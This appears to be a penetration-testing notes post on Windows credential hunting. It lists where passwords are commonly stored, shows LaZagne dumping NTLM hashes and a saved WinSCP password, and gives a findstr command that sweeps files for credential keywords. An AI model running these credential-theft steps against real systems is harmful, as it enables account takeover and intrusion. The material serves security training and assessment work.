---
title: Windows Credential Hunting
date: 2025-11-26 11:39:15

categories:
  - Active Directory
  - Windows
  - Post-Exploitation
  - Credential Hunting

tags:
  - Lazagne
  - Search-for-File-Content

cover: /img/zoom.png
top_img: /img/bg-img.jpg
description: Hunt on windows system for credentials.
---


## Common Password Location

- `C:\Users\ALA\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt`
- `Passwords in Group Policy in the SYSVOL share`
- `Passwords in scripts in the SYSVOL share`
- `Password in scripts on IT shares`
- `Passwords in web.config files on dev machines and IT shares`
- `Password in unattend.xml`
- `Passwords in the AD user or computer description fields`
- `KeePass databases (if we are able to guess or crack the master password)`
- `Found on user systems and shares`
- `Files with names like pass.txt, passwords.docx, passwords.xlsx found on user systems, shares, and Sharepoint`


## LaZagne

Normal User Access : 

- `Browser passwords (Chrome / Edge / Firefox)`
- `Application credentials`
- `Wifi passwords`
- `Chat app passwords`
- `Mail client passwords`
- `Windows Credential Manager secrets (current user only)`

Administrator Access :

- `LSASS`
- `LSA`
- `KeePass memory extraction`


```cmd
C:\Users\bob\Desktop> start LaZagne.exe all


Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:72639bbb94990305b5a015220f8de34e:::
bob:1001:aad3b435b51404eeaad3b435b51404ee:3c0e5d303ec84884ad5c3b7876a06ea6:::


########## User: bob ##########

------------------- Winscp passwords -----------------

[+] Password found !!!
URL: 10.129.202.64
Login: ubuntu
Password: FSadmin123
Port: 22
```


## Search for File Content - findstr

```powershell
findstr /SIM /C:"password" /C:"passphrase" /C:"key" /C:"username" /C:"user account" /C:"creds" /C:"users" /C:"passkeys" /C:"configuration" /C:"dbcredential" /C:"dbpassword" /C:"pwd" /C:"login" /C:"credentials" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml
```


